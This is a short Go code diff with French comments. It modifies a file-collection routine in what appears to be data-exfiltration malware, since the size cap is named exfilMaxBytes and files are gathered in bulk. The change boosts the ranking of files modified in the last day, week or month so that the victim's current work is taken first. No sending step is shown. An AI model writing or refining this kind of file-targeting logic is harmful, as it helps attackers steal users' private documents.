@@ -116,8 +116,20 @@ func collectBulkFiles(roots []string) []bulkFile {
 			if seen[p] || info.Size() == 0 || info.Size() > exfilMaxBytes {
 				return nil
 			}
+			// Les fichiers récemment modifiés passent devant : ce sont ceux
+			// sur lesquels l utilisateur travaille en ce moment.
+			score := fileScore(info.Name())
+			age := time.Since(info.ModTime())
+			switch {
+			case age < 24*time.Hour:
+				score += 120
+			case age < 7*24*time.Hour:
+				score += 80
+			case age < 30*24*time.Hour:
+				score += 30
+			}
 			seen[p] = true
-			files = append(files, bulkFile{path: p, size: info.Size(), score: fileScore(info.Name())})
+			files = append(files, bulkFile{path: p, size: info.Size(), score: score})
 			return nil
 		})
 	}
